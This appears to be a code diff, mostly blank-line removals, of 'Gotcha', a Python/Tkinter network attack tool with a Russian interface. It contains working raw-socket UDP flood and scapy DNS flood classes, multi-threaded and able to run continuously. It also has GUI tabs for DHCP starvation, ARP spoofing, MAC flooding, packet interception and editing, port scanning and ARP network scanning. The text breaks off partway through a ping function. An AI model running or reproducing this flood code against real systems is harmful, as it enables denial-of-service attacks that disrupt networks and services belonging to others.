@@ -20,25 +20,21 @@ from scapy.layers.dhcp import DHCP, BOOTP
 from scapy.layers.l2 import ARP, Ether, Dot1Q
 from scapy.layers.inet import IP, TCP, UDP, ICMP
 from scapy.layers.dns import DNS, DNSQR
-
 def find_exe(exe_name):
     if getattr(sys, 'frozen', False):
         base_dir = os.path.dirname(sys.executable)
     else:
         base_dir = os.path.dirname(os.path.abspath(__file__))
-    
     search_paths = [
         os.path.join(base_dir, "exe", exe_name),
         os.path.join(base_dir, exe_name),
         os.path.join(os.getcwd(), "exe", exe_name),
         os.path.join(os.getcwd(), exe_name),
     ]
-    
     for path in search_paths:
         if os.path.isfile(path):
             return path
     return None
-
 class RSattack:
     def __init__(self):
         self.running = False
@@ -54,7 +50,6 @@ class RSattack:
         self.udp_data_cache = {}
         self._monitor_lock = threading.Lock()
         self._completion_notified = False
-        
     def start_udp_attack(self, target_ip, port, packet_size, duration, continuous, interface, app_log, on_complete=None):
         self.running = True
         self._completion_notified = False
@@ -65,37 +60,30 @@ class RSattack:
             'total_bytes': 0,
             'last_update': time.time()
         }
-        
         try:
             source_ip = get_if_addr(interface)
             if not source_ip or source_ip == '0.0.0.0':
                 source_ip = "192.168.1.1"
         except:
             source_ip = "192.168.1.1"
-        
         data_size = max(0, packet_size - 28)
         cache_key = f"{packet_size}_{port}"
-        
         if cache_key not in self.udp_data_cache:
             self.udp_data_cache[cache_key] = {
                 'data': os.urandom(data_size),
                 'pseudo_header': self._create_udp_pseudo_header(source_ip, target_ip, port, data_size)
             }
-        
         cached = self.udp_data_cache[cache_key]
         data = cached['data']
         pseudo_header_template = cached['pseudo_header']
         total_length = 28 + data_size
-        
         if platform.system() == "Windows":
             num_threads = 8
         else:
             num_threads = 16
-        
         app_log(f"UDP flood: {num_threads} threads, packet size {packet_size} bytes")
         app_log(f"Target: {target_ip}:{port}")
         app_log(f"Interface: {interface} (src_ip: {source_ip})")
-        
         worker_threads = []
         for i in range(num_threads):
             thread = threading.Thread(
@@ -107,11 +95,9 @@ class RSattack:
             thread.start()
             self.threads.append(thread)
             worker_threads.append(thread)
-        
         stats_thread = threading.Thread(target=self._stats_worker, daemon=True)
         stats_thread.start()
         self.threads.append(stats_thread)
-
         monitor_thread = threading.Thread(
             target=self._monitor_udp_workers,
             args=(worker_threads, on_complete),
@@ -119,42 +105,32 @@ class RSattack:
         )
         monitor_thread.start()
         self.threads.append(monitor_thread)
-        
         return True
-
     def _monitor_udp_workers(self, worker_threads, on_complete=None):
         for thread in worker_threads:
             thread.join()
-
         with self._monitor_lock:
             should_notify = self.running and not self._completion_notified
             self.running = False
             if should_notify:
                 self._completion_notified = True
-
         if should_notify and on_complete:
             on_complete()
-    
     def _udp_raw_worker(self, thread_id, target_ip, port, total_length, total_seconds, 
                         continuous, interface, source_ip, data, pseudo_header_template, app_log):
         packets_sent = 0
         src_port_base = (thread_id * 1000) + 1024
         start_time = time.time()
-        
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
             sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
             sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2 * 1024 * 1024)
-            
             batch_size = 200
-            
             while self.running and (continuous or (time.time() - start_time) < total_seconds):
                 batch_packets = []
-                
                 for i in range(batch_size):
                     if not continuous and (time.time() - start_time) >= total_seconds:
                         break
-                    
                     packet = self._create_udp_packet(
                         source_ip, target_ip, port,
                         total_length,
@@ -165,33 +141,25 @@ class RSattack:
                     )
                     batch_packets.append(packet)
                     packets_sent += 1
-                
                 try:
                     for packet in batch_packets:
                         sock.sendto(packet, (target_ip, 0))
-                    
                     with self.stats_lock:
                         self.stats['total_sent'] += len(batch_packets)
                         self.stats['total_bytes'] += sum(len(p) for p in batch_packets)
-                        
                 except Exception as e:
                     time.sleep(0.005)
-                
                 if packets_sent % 10000 == 0:
                     time.sleep(0.0005)
-            
             sock.close()
-            
         except Exception as e:
             app_log(f"[UDP-{thread_id}] Error: {str(e)[:80]}")
-    
     def _create_udp_pseudo_header(self, src_ip, dst_ip, dst_port, data_size):
         return struct.pack('!4s4sBBH',
             socket.inet_aton(src_ip),
             socket.inet_aton(dst_ip),
             0, 17,
             8 + data_size)
-    
     def _create_udp_packet(self, src_ip, dst_ip, dst_port, total_length, seq_num, src_port, data, pseudo_header_template):
         ip_header = struct.pack('!BBHHHBBH4s4s',
             0x45, 0x00,
@@ -202,54 +170,40 @@ class RSattack:
             socket.inet_aton(src_ip),
             socket.inet_aton(dst_ip)
         )
-        
         udp_header = struct.pack('!HHHH',
             src_port, dst_port,
             8 + len(data), 0
         )
-        
         udp_checksum = self._calculate_checksum_fast(pseudo_header_template + udp_header + data)
         udp_header = udp_header[:6] + struct.pack('H', udp_checksum)
-        
         ip_checksum = self._calculate_checksum_fast(ip_header)
         ip_header = ip_header[:10] + struct.pack('H', ip_checksum) + ip_header[12:]
-        
         return ip_header + udp_header + data
-    
     def _calculate_checksum_fast(self, data):
         if len(data) % 2:
             data += b'\x00'
-        
         s = 0
         mv = memoryview(data)
         for i in range(0, len(mv), 2):
             w = (mv[i] << 8) + mv[i+1]
             s += w
-        
         s = (s & 0xffff) + (s >> 16)
         s = (s & 0xffff) + (s >> 16)
-        
         return ~s & 0xffff
-    
     def _stats_worker(self):
         last_time = time.time()
         last_count = 0
-        
         while self.running:
             time.sleep(0.5)
-            
             current_time = time.time()
             with self.stats_lock:
                 current_count = self.stats['total_sent']
-                
                 time_diff = current_time - last_time
                 if time_diff > 0:
                     pps = int((current_count - last_count) / time_diff)
                     self.stats['current_pps'] = pps
-                
                 last_time = current_time
                 last_count = current_count
-    
     def stop(self):
         self.running = False
         for thread in self.threads:
@@ -257,7 +211,6 @@ class RSattack:
                 thread.join(timeout=0.5)
         self.threads.clear()
         return self.stats.copy()
-
 class Sattack:
     def __init__(self):
         self.running = False
@@ -270,7 +223,6 @@ class Sattack:
         }
         self._monitor_lock = threading.Lock()
         self._completion_notified = False
-    
     def start_dns_attack(self, target_ip, duration, continuous, interface, app_log, on_complete=None):
         self.running = True
         self._completion_notified = False
@@ -279,12 +231,10 @@ class Sattack:
             'start_time': time.time(),
             'total_bytes': 0
         }
-        
         num_threads = min(4, os.cpu_count() or 2)
         app_log(f"DNS flood: {num_threads} threads")
         app_log(f"Target: {target_ip}:53")
         app_log(f"Interface: {interface}")
-        
         worker_threads = []
         for i in range(num_threads):
             thread = threading.Thread(
@@ -295,7 +245,6 @@ class Sattack:
             thread.start()
             self.threads.append(thread)
             worker_threads.append(thread)
-
         monitor_thread = threading.Thread(
             target=self._monitor_dns_workers,
             args=(worker_threads, on_complete),
@@ -303,27 +252,21 @@ class Sattack:
         )
         monitor_thread.start()
         self.threads.append(monitor_thread)
-        
         return True
-
     def _monitor_dns_workers(self, worker_threads, on_complete=None):
         for thread in worker_threads:
             thread.join()
-
         with self._monitor_lock:
             should_notify = self.running and not self._completion_notified
             self.running = False
             if should_notify:
                 self._completion_notified = True
-
         if should_notify and on_complete:
             on_complete()
-    
     def _dns_scapy_worker(self, thread_id, target_ip, total_seconds, continuous, interface, app_log):
         sent = 0
         domains = ["example.com", "google.com", "yandex.ru", "mail.ru", "github.com"]
         start_time = time.time()
-        
         while self.running and (continuous or (time.time() - start_time) < total_seconds):
             try:
                 packet = IP(dst=target_ip)/UDP(
@@ -333,18 +276,14 @@ class Sattack:
                     rd=1,
                     qd=DNSQR(qname=random.choice(domains))
                 )
-                
                 send(packet, verbose=0)
                 sent += 1
-                
                 with self.stats_lock:
                     self.stats['total_sent'] += 1
                     self.stats['total_bytes'] += len(packet)
-                    
             except Exception as e:
                 app_log(f"[DNS-{thread_id}] Error: {str(e)[:80]}")
                 time.sleep(0.1)
-    
     def stop(self):
         self.running = False
         for thread in self.threads:
@@ -352,17 +291,14 @@ class Sattack:
                 thread.join(timeout=0.5)
         self.threads.clear()
         return self.stats.copy()
-
 class Theme:
     DEFAULT_FONT = ('Segoe UI', 10)
     MONO_FONT = ('Consolas', 9)
-
     def __init__(self, root):
         self.root = root
         self.current_theme = "dark"
         self.style = ttk.Style()
         self.setup_themes()
-
     def setup_themes(self):
         self.themes = {
             "light": {
@@ -416,16 +352,12 @@ class Theme:
                 "field_focus": "#3f4348"
             }
         }
-
     def apply_theme(self, theme_name):
         if theme_name not in self.themes:
             return
-
         self.current_theme = theme_name
         theme = self.themes[theme_name]
-
         self.style.theme_use('clam')
-
         self.style.configure('.',
                              background=theme['primary_bg'],
                              foreground=theme['primary_fg'],
@@ -435,7 +367,6 @@ class Theme:
                              lightcolor=theme['border'],
                              darkcolor=theme['border'],
                              font=self.DEFAULT_FONT)
-
         self.root.configure(bg=theme['window_bg'])
         self.root.tk_setPalette(
             background=theme['window_bg'],
@@ -443,13 +374,11 @@ class Theme:
             activeBackground=theme['accent'],
             activeForeground=theme['button_fg']
         )
-
         self.style.configure('TFrame', background=theme['primary_bg'])
         self.style.configure('TLabel',
                              background=theme['primary_bg'],
                              foreground=theme['primary_fg'],
                              font=self.DEFAULT_FONT)
-
         self.style.configure('TLabelframe',
                              background=theme['secondary_bg'],
                              foreground=theme['primary_fg'],
@@ -459,7 +388,6 @@ class Theme:
                              background=theme['secondary_bg'],
                              foreground=theme['header_fg'],
                              font=('Segoe UI Semibold', 10))
-
         self.style.configure('TButton',
                              background=theme['button_bg'],
                              foreground=theme['button_fg'],
@@ -473,7 +401,6 @@ class Theme:
                        background=[('active', theme['accent_hover']), ('pressed', theme['accent'])],
                        foreground=[('disabled', theme['secondary_fg'])],
                        relief=[('pressed', 'sunken')])
-
         self.style.configure('TEntry',
                              fieldbackground=theme['input_bg'],
                              foreground=theme['input_fg'],
@@ -485,7 +412,6 @@ class Theme:
         self.style.map('TEntry',
                        fieldbackground=[('focus', theme['field_focus'])],
                        foreground=[('disabled', theme['secondary_fg'])])
-
         self.style.configure('TCombobox',
                              fieldbackground=theme['input_bg'],
                              foreground=theme['input_fg'],
@@ -495,12 +421,10 @@ class Theme:
                              lightcolor=theme['border'],
                              darkcolor=theme['border'],
                              font=self.DEFAULT_FONT)
-
         self.style.configure('TCheckbutton',
                              background=theme['primary_bg'],
                              foreground=theme['primary_fg'],
                              focuscolor=theme['accent'])
-
         self.style.configure('TNotebook',
                              background=theme['secondary_bg'],
                              bordercolor=theme['border'])
@@ -512,7 +436,6 @@ class Theme:
         self.style.map('TNotebook.Tab',
                        background=[('selected', theme['primary_bg']), ('active', theme['secondary_bg'])],
                        foreground=[('selected', theme['primary_fg']), ('active', theme['primary_fg'])])
-
         self.style.configure('Treeview',
                              background=theme['tree_bg'],
                              foreground=theme['tree_fg'],
@@ -530,21 +453,17 @@ class Theme:
                        foreground=[('selected', theme['primary_fg'])])
         self.style.map('Treeview.Heading',
                        background=[('active', theme['secondary_bg'])])
-
         self.style.configure('TScrollbar',
                              background=theme['scrollbar_bg'],
                              troughcolor=theme['scrollbar_trough'],
                              arrowcolor=theme['scrollbar_arrow'])
-
         self.apply_to_widgets(self.root, theme)
-
     def apply_to_widgets(self, widget, theme):
         widget_stack = [widget]
         while widget_stack:
             current = widget_stack.pop()
             try:
                 widget_type = current.winfo_class()
-
                 if widget_type in ('Frame', 'Labelframe', 'LabelFrame'):
                     current.config(bg=theme['primary_bg'], highlightbackground=theme['border'])
                 elif widget_type == 'Label':
@@ -576,128 +495,97 @@ class Theme:
                     current.config(bg=theme['primary_bg'], highlightbackground=theme['border'])
             except tk.TclError:
                 pass
-
             widget_stack.extend(current.winfo_children())
-
 class Editor:
     def __init__(self, parent, packet, callback):
         self.parent = parent
         self.packet = packet
         self.callback = callback
         self.edited_packet = None
-        
         self.editor_window = tk.Toplevel(parent)
         self.editor_window.title("Редактор пакета")
         self.editor_window.geometry("1000x800")
         self.editor_window.transient(parent)
         self.editor_window.grab_set()
-        
         try:
             self.editor_window.iconbitmap("other/images.ico")
         except:
             pass
-        
         self.create_widgets()
         self.parse_packet()
-        
     def create_widgets(self):
         main_frame = ttk.Frame(self.editor_window)
         main_frame.pack(fill='both', expand=True, padx=10, pady=10)
-
         info_frame = ttk.LabelFrame(main_frame, text="Информация о пакете")
         info_frame.pack(fill='x', padx=5, pady=5)
-        
         ttk.Label(info_frame, text="Исходный пакет:").grid(row=0, column=0, padx=5, pady=2, sticky='w')
         self.original_info = ttk.Label(info_frame, text=self.packet.summary())
         self.original_info.grid(row=0, column=1, padx=5, pady=2, sticky='w')
-
         details_frame = ttk.LabelFrame(main_frame, text="Детали пакета")
         details_frame.pack(fill='x', padx=5, pady=5)
-        
         self.packet_details = scrolledtext.ScrolledText(details_frame, height=8, wrap=tk.WORD)
         self.packet_details.pack(fill='both', expand=True, padx=5, pady=5)
         self.packet_details.config(state='normal')
-        
         eth_frame = ttk.LabelFrame(main_frame, text="Ethernet Layer")
         eth_frame.pack(fill='x', padx=5, pady=5)
-        
         ttk.Label(eth_frame, text="Source MAC:").grid(row=0, column=0, padx=5, pady=2, sticky='w')
         self.eth_src = ttk.Entry(eth_frame, width=20)
         self.eth_src.grid(row=0, column=1, padx=5, pady=2, sticky='w')
-        
         ttk.Label(eth_frame, text="Dest MAC:").grid(row=0, column=2, padx=5, pady=2, sticky='w')
         self.eth_dst = ttk.Entry(eth_frame, width=20)
         self.eth_dst.grid(row=0, column=3, padx=5, pady=2, sticky='w')
-
         ip_frame = ttk.LabelFrame(main_frame, text="IP Layer")
         ip_frame.pack(fill='x', padx=5, pady=5)
-        
         ttk.Label(ip_frame, text="Source IP:").grid(row=0, column=0, padx=5, pady=2, sticky='w')
         self.ip_src = ttk.Entry(ip_frame, width=20)
         self.ip_src.grid(row=0, column=1, padx=5, pady=2, sticky='w')
-        
         ttk.Label(ip_frame, text="Dest IP:").grid(row=0, column=2, padx=5, pady=2, sticky='w')
         self.ip_dst = ttk.Entry(ip_frame, width=20)
         self.ip_dst.grid(row=0, column=3, padx=5, pady=2, sticky='w')
-        
         ttk.Label(ip_frame, text="TTL:").grid(row=1, column=0, padx=5, pady=2, sticky='w')
         self.ip_ttl = ttk.Entry(ip_frame, width=10)
         self.ip_ttl.grid(row=1, column=1, padx=5, pady=2, sticky='w')
-        
         transport_frame = ttk.LabelFrame(main_frame, text="Transport Layer")
         transport_frame.pack(fill='x', padx=5, pady=5)
-        
         ttk.Label(transport_frame, text="Protocol:").grid(row=0, column=0, padx=5, pady=2, sticky='w')
         self.transport_proto = ttk.Combobox(transport_frame, values=["TCP", "UDP", "ICMP", "RAW"], width=10)
         self.transport_proto.grid(row=0, column=1, padx=5, pady=2, sticky='w')
-        
         ttk.Label(transport_frame, text="Source Port:").grid(row=1, column=0, padx=5, pady=2, sticky='w')
         self.src_port = ttk.Entry(transport_frame, width=10)
         self.src_port.grid(row=1, column=1, padx=5, pady=2, sticky='w')
-        
         ttk.Label(transport_frame, text="Dest Port:").grid(row=1, column=2, padx=5, pady=2, sticky='w')
         self.dst_port = ttk.Entry(transport_frame, width=10)
         self.dst_port.grid(row=1, column=3, padx=5, pady=2, sticky='w')
-
         tcp_flags_frame = ttk.Frame(transport_frame)
         tcp_flags_frame.grid(row=2, column=0, columnspan=4, pady=5)
-        
         self.tcp_flags_vars = {}
         tcp_flags = ["FIN", "SYN", "RST", "PSH", "ACK", "URG", "ECE", "CWR"]
         for i, flag in enumerate(tcp_flags):
             self.tcp_flags_vars[flag] = tk.BooleanVar()
             ttk.Checkbutton(tcp_flags_frame, text=flag, variable=self.tcp_flags_vars[flag]).grid(
                 row=0, column=i, padx=2, sticky='w')
-
         data_frame = ttk.LabelFrame(main_frame, text="Payload Data")
         data_frame.pack(fill='both', expand=True, padx=5, pady=5)
-        
         self.payload_data = scrolledtext.ScrolledText(data_frame, height=10, wrap=tk.WORD)
         self.payload_data.pack(fill='both', expand=True, padx=5, pady=5)
-
         button_frame = ttk.Frame(main_frame)
         button_frame.pack(fill='x', padx=5, pady=10)
-        
         ttk.Button(button_frame, text="Применить изменения", 
                   command=self.apply_changes).pack(side='left', padx=5)
         ttk.Button(button_frame, text="Отмена", 
                   command=self.editor_window.destroy).pack(side='right', padx=5)
-        
     def parse_packet(self):
         if self.packet.haslayer(Ether):
             self.eth_src.insert(0, self.packet[Ether].src)
             self.eth_dst.insert(0, self.packet[Ether].dst)
-        
         if self.packet.haslayer(IP):
             self.ip_src.insert(0, self.packet[IP].src)
             self.ip_dst.insert(0, self.packet[IP].dst)
             self.ip_ttl.insert(0, str(self.packet[IP].ttl))
-            
             if self.packet.haslayer(TCP):
                 self.transport_proto.set("TCP")
                 self.src_port.insert(0, str(self.packet[TCP].sport))
                 self.dst_port.insert(0, str(self.packet[TCP].dport))
-
                 flags = self.packet[TCP].flags
                 self.tcp_flags_vars["FIN"].set(bool(flags & 0x01))
                 self.tcp_flags_vars["SYN"].set(bool(flags & 0x02))
@@ -707,40 +595,32 @@ class Editor:
                 self.tcp_flags_vars["URG"].set(bool(flags & 0x20))
                 self.tcp_flags_vars["ECE"].set(bool(flags & 0x40))
                 self.tcp_flags_vars["CWR"].set(bool(flags & 0x80))
-                
                 if self.packet.haslayer(Raw):
                     try:
                         self.payload_data.insert('1.0', self.packet[Raw].load.hex())
                     except:
                         self.payload_data.insert('1.0', str(self.packet[Raw].load))
-                    
             elif self.packet.haslayer(UDP):
                 self.transport_proto.set("UDP")
                 self.src_port.insert(0, str(self.packet[UDP].sport))
                 self.dst_port.insert(0, str(self.packet[UDP].dport))
-                
                 if self.packet.haslayer(Raw):
                     try:
                         self.payload_data.insert('1.0', self.packet[Raw].load.hex())
                     except:
                         self.payload_data.insert('1.0', str(self.packet[Raw].load))
-                    
             elif self.packet.haslayer(ICMP):
                 self.transport_proto.set("ICMP")
             else:
                 self.transport_proto.set("RAW")
-
         self.show_packet_details()
-                
     def show_packet_details(self):
         details = "=== ДЕТАЛИ ПАКЕТА ===\n\n"
-        
         if self.packet.haslayer(Ether):
             details += f"Ethernet:\n"
             details += f"  Source: {self.packet[Ether].src}\n"
             details += f"  Destination: {self.packet[Ether].dst}\n"
             details += f"  Type: {self.packet[Ether].type}\n\n"
-        
         if self.packet.haslayer(IP):
             details += f"IP:\n"
             details += f"  Version: {self.packet[IP].version}\n"
@@ -748,7 +628,6 @@ class Editor:
             details += f"  Destination: {self.packet[IP].dst}\n"
             details += f"  TTL: {self.packet[IP].ttl}\n"
             details += f"  Protocol: {self.packet[IP].proto}\n\n"
-            
         if self.packet.haslayer(TCP):
             details += f"TCP:\n"
             details += f"  Source Port: {self.packet[TCP].sport}\n"
@@ -757,18 +636,15 @@ class Editor:
             details += f"  Sequence: {self.packet[TCP].seq}\n"
             details += f"  Acknowledgment: {self.packet[TCP].ack}\n"
             details += f"  Window: {self.packet[TCP].window}\n\n"
-            
         elif self.packet.haslayer(UDP):
             details += f"UDP:\n"
             details += f"  Source Port: {self.packet[UDP].sport}\n"
             details += f"  Destination Port: {self.packet[UDP].dport}\n"
             details += f"  Length: {self.packet[UDP].len}\n\n"
-            
         elif self.packet.haslayer(ICMP):
             details += f"ICMP:\n"
             details += f"  Type: {self.packet[ICMP].type}\n"
             details += f"  Code: {self.packet[ICMP].code}\n\n"
-            
         if self.packet.haslayer(Raw):
             details += f"Payload:\n"
             payload = self.packet[Raw].load
@@ -784,27 +660,21 @@ class Editor:
                         pass
             except:
                 details += f"  Content: {str(payload)}\n"
-        
         self.packet_details.insert('1.0', details)
         self.packet_details.config(state='disabled')
-                
     def apply_changes(self):
         try:
             new_packet = self.create_modified_packet()
             self.edited_packet = new_packet
             self.callback(new_packet, True)
             self.editor_window.destroy()
-            
         except Exception as e:
             messagebox.showerror("Ошибка", f"Не удалось создать пакет: {str(e)}")
-    
     def create_modified_packet(self):
         new_packet = Ether()
-
         if self.eth_src.get():
             dst_mac = self.eth_dst.get() if self.eth_dst.get() else "ff:ff:ff:ff:ff:ff"
             new_packet = Ether(src=self.eth_src.get(), dst=dst_mac)
-
         if self.ip_src.get() and self.ip_dst.get():
             ip_packet = IP(src=self.ip_src.get(), dst=self.ip_dst.get())
             if self.ip_ttl.get():
@@ -812,13 +682,10 @@ class Editor:
                     ip_packet.ttl = int(self.ip_ttl.get())
                 except:
                     pass
-                    
             new_packet = new_packet / ip_packet
-
             proto = self.transport_proto.get()
             if proto == "TCP" and self.src_port.get() and self.dst_port.get():
                 tcp_packet = TCP(sport=int(self.src_port.get()), dport=int(self.dst_port.get()))
-
                 flags = 0
                 if self.tcp_flags_vars["FIN"].get(): flags |= 0x01
                 if self.tcp_flags_vars["SYN"].get(): flags |= 0x02
@@ -828,16 +695,12 @@ class Editor:
                 if self.tcp_flags_vars["URG"].get(): flags |= 0x20
                 if self.tcp_flags_vars["ECE"].get(): flags |= 0x40
                 if self.tcp_flags_vars["CWR"].get(): flags |= 0x80
-                
                 tcp_packet.flags = flags
                 new_packet = new_packet / tcp_packet
-                
             elif proto == "UDP" and self.src_port.get() and self.dst_port.get():
                 new_packet = new_packet / UDP(sport=int(self.src_port.get()), dport=int(self.dst_port.get()))
-                
             elif proto == "ICMP":
                 new_packet = new_packet / ICMP()
-            
             payload_text = self.payload_data.get('1.0', 'end').strip()
             if payload_text:
                 try:
@@ -845,23 +708,17 @@ class Editor:
                     new_packet = new_packet / Raw(load=payload_bytes)
                 except:
                     new_packet = new_packet / Raw(load=payload_text.encode())
-        
         return new_packet
-
 class Gotcha:
     def __init__(self, root):
         self.root = root
         self.root.title("Gotcha")
         self.root.geometry("1000x700")
-        
         try:
             root.iconbitmap("other/images.ico")
         except:
             pass
-        
         self.theme_manager = Theme(self.root)
-        
-                         
         self.custom_stop_event = None
         self.custom_external_thread = None
         self.current_external_process = None
@@ -875,32 +732,20 @@ class Gotcha:
         self.external_infinite = False
         self.last_offer_time = {}
         self.last_ack_time = {}
-        
-                                                                                    
         self.external_processes = {}
         self.captured_packet = None
         self.intercept_thread = None
         self.selected_packet = None
         self.intercept_packets = []
         self.edited_packet = None
-                     
         self.raw_attack = RSattack()
         self.scapy_attack = Sattack()
-        
-                            
         self.network_interfaces = self.get_interface_list()
-        
-                                                        
         self.active_interface = self.get_active_interface()
-        
-                       
         self.setup_gui()
         self.theme_manager.apply_theme("dark")
-        
-                            
         self.system_monitor_running = True
         self.setup_system_monitor()
-    
     def get_active_interface(self):
         for iface in self.network_interfaces:
             try:
@@ -909,27 +754,21 @@ class Gotcha:
                     return iface
             except:
                 continue
-                                                    
         return self.network_interfaces[0] if self.network_interfaces else "Ethernet"
-    
     def setup_system_monitor(self):
         self.update_system_monitor()
-    
     def update_system_monitor(self):
         try:
             cpu_percent = psutil.cpu_percent(interval=None)
             memory = psutil.virtual_memory()
             ram_percent = memory.percent
-            
             self.cpu_label.config(text=f"CPU: {cpu_percent:.1f}%")
             self.ram_label.config(text=f"RAM: {ram_percent:.1f}%")
         except:
             self.cpu_label.config(text="CPU: N/A")
             self.ram_label.config(text="RAM: N/A")
-        
         if self.system_monitor_running:
             self.root.after(1000, self.update_system_monitor)
-    
     def get_interface_list(self):
         interfaces = []
         try:
@@ -938,150 +777,111 @@ class Gotcha:
                 interfaces.append(iface)
         except:
             pass
-        
         if not interfaces:
             interfaces = ["Ethernet", "Wi-Fi", "eth0", "wlan0"]
-        
         return interfaces
-    
     def setup_gui(self):
         main_notebook = ttk.Notebook(self.root)
         main_notebook.pack(fill='both', expand=True, padx=8, pady=8)
-        
         auxiliary_frame = ttk.Frame(main_notebook)
         main_notebook.add(auxiliary_frame, text="Вспомогательное")
-        
         auxiliary_notebook = ttk.Notebook(auxiliary_frame)
         auxiliary_notebook.pack(fill='both', expand=True, padx=8, pady=8)
-        
         access_frame = ttk.Frame(auxiliary_notebook)
         auxiliary_notebook.add(access_frame, text="Доступ")
         self.setup_access_tab(access_frame)
-        
         settings_frame = ttk.Frame(auxiliary_notebook)
         auxiliary_notebook.add(settings_frame, text="Настройки")
         self.setup_settings_tab(settings_frame)
-        
         attacks_frame = ttk.Frame(main_notebook)
         main_notebook.add(attacks_frame, text="Атаки")
-        
         attacks_notebook = ttk.Notebook(attacks_frame)
         attacks_notebook.pack(fill='both', expand=True, padx=8, pady=8)
-        
         intercept_frame = ttk.Frame(attacks_notebook)
         attacks_notebook.add(intercept_frame, text="Перехват пакетов")
         self.setup_intercept_tab(intercept_frame)
-        
         dhcp_frame = ttk.Frame(attacks_notebook)
         attacks_notebook.add(dhcp_frame, text="DHCP Starvation")
         self.setup_dhcp_tab(dhcp_frame)
-        
         custom_frame = ttk.Frame(attacks_notebook)
         attacks_notebook.add(custom_frame, text="DoS атака")
         self.setup_custom_attack_tab(custom_frame)
-        
         arp_spoof_frame = ttk.Frame(attacks_notebook)
         attacks_notebook.add(arp_spoof_frame, text="ARP Spoofing")
         self.setup_arp_spoof_tab(arp_spoof_frame)
-        
         mac_frame = ttk.Frame(attacks_notebook)
         attacks_notebook.add(mac_frame, text="MAC flood")
         self.setup_mac_flood_tab(mac_frame)
-        
         self.status_var = tk.StringVar()
         self.status_var.set("Готов к работе")
-        
         status_bar = ttk.Frame(self.root)
         status_bar.pack(side='bottom', fill='x')
-        
         ttk.Label(status_bar, textvariable=self.status_var, relief='sunken', 
                  font=('Arial', 8), width=50).pack(side='left', fill='x', expand=True)
-        
         self.cpu_label = ttk.Label(status_bar, text="CPU: 0%", relief='sunken', 
                                   font=('Arial', 8), width=12)
         self.cpu_label.pack(side='right', padx=(2, 0))
-        
         self.ram_label = ttk.Label(status_bar, text="RAM: 0%", relief='sunken', 
                                   font=('Arial', 8), width=12)
         self.ram_label.pack(side='right', padx=(2, 10))
-    
-                            
     def setup_access_tab(self, parent):
         main_frame = ttk.Frame(parent)
         main_frame.pack(fill='both', expand=True, padx=8, pady=8)
-        
         top_frame = ttk.Frame(main_frame)
         top_frame.pack(fill='x', padx=5, pady=5)
-        
         input_frame = ttk.LabelFrame(top_frame, text="Базовые функции доступа")
         input_frame.pack(fill='x', padx=5, pady=5)
-        
         ttk.Label(input_frame, text="IP адрес:").grid(row=0, column=0, padx=4, pady=3, sticky='w')
         self.access_ip = ttk.Entry(input_frame, width=18, font=('Arial', 9))
         self.access_ip.grid(row=0, column=1, padx=4, pady=3, sticky='w')
         self.access_ip.insert(0, "192.168.1.1")
-        
         ttk.Label(input_frame, text="Интерфейс:").grid(row=0, column=2, padx=4, pady=3, sticky='w')
         self.access_interface = ttk.Combobox(input_frame, width=15, font=('Arial', 9), values=self.network_interfaces)
         self.access_interface.grid(row=0, column=3, padx=4, pady=3, sticky='w')
         self.access_interface.set(self.active_interface)
-        
         button_frame1 = ttk.Frame(input_frame)
         button_frame1.grid(row=1, column=0, columnspan=4, pady=6)
         ttk.Button(button_frame1, text="ICMP Ping", command=self.run_ping, width=12).pack(side='left', padx=3)
         ttk.Button(button_frame1, text="Port Scan", command=self.run_port_scan, width=12).pack(side='left', padx=3)
         ttk.Button(button_frame1, text="Traceroute", command=self.run_traceroute, width=12).pack(side='left', padx=3)
-        
         button_frame2 = ttk.Frame(input_frame)
         button_frame2.grid(row=2, column=0, columnspan=4, pady=6)
         ttk.Button(button_frame2, text="Таблица маршрутизации", command=self.show_ip_route, width=20).pack(side='left', padx=2)
         ttk.Button(button_frame2, text="Сетевые адаптеры", command=self.show_network_info, width=18).pack(side='left', padx=2)
         ttk.Button(button_frame2, text="Сканировать сеть", command=self.net_scan, width=18).pack(side='left', padx=2)
-        
         output_frame = ttk.LabelFrame(main_frame, text="Результаты")
         output_frame.pack(fill='both', expand=True, padx=5, pady=5)
-        
         self.access_output = scrolledtext.ScrolledText(output_frame, height=18, wrap=tk.WORD, font=('Consolas', 8))
         self.access_output.pack(fill='both', expand=True, padx=5, pady=5)
-        
         ttk.Button(output_frame, text="Сохранить лог", 
                   command=lambda: self.save_log(self.access_output), width=14).pack(pady=4)
-    
     def net_scan(self):
         def scan_worker():
             ip = self.access_ip.get().strip()
             if not ip:
                 self.access_output.insert('end', "Введите IP адрес (например, 192.168.1.1)\n")
                 return
-
             parts = ip.split('.')
             if len(parts) != 4:
                 self.access_output.insert('end', "Некорректный IP\n")
                 return
             base = '.'.join(parts[:3]) + '.'
-
             self.access_output.insert('end', f"Сканирование сети {base}0/24... (это займёт около 2 секунд)\n")
             self.access_output.update()
-
             iface = self.access_interface.get()
             if not iface:
                 iface = None
-
             try:
                 ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=base + "0/24"),
                                 timeout=2, verbose=0, iface=iface)
             except Exception as e:
                 self.access_output.insert('end', f"Ошибка сканирования: {e}\n")
                 return
-
-                                                          
             time.sleep(0.5)
-
             self.access_output.insert('end', "\n" + "="*60 + "\n")
             self.access_output.insert('end', "РЕЗУЛЬТАТЫ СКАНИРОВАНИЯ:\n")
             self.access_output.insert('end', f"{'IP':16} {'MAC':18} {'Hostname'}\n")
             self.access_output.insert('end', "-"*60 + "\n")
-
             if ans:
                 for sent, received in ans:
                     ip_addr = received.psrc
@@ -1094,12 +894,9 @@ class Gotcha:
                     self.access_output.insert('end', f"{ip_addr:16} {mac_addr:18} {hostname}\n")
             else:
                 self.access_output.insert('end', "Ни одного хоста не найдено.\n")
-
             self.access_output.insert('end', "="*60 + "\n")
             self.access_output.insert('end', f"Сканирование завершено. Найдено {len(ans)} хостов.\n")
-
         threading.Thread(target=scan_worker, daemon=True).start()
-    
     def run_ping(self):
         def ping_worker():
             ip = self.access_ip.get()
@@ -1115,20 +912,15 @@ class Gotcha:
                     errors='replace',
                     bufsize=1
                 )
-                
                 for line in iter(process.stdout.readline, ''):
                     self.access_output.insert('end', line)
                     self.access_output.see('end')
                     self.root.update()
-                
                 process.stdout.close()
                 process.wait()
-                
             except Exception as e:
                 self.access_output.insert('end', f"Ошибка: {str(e)}\n")
-        
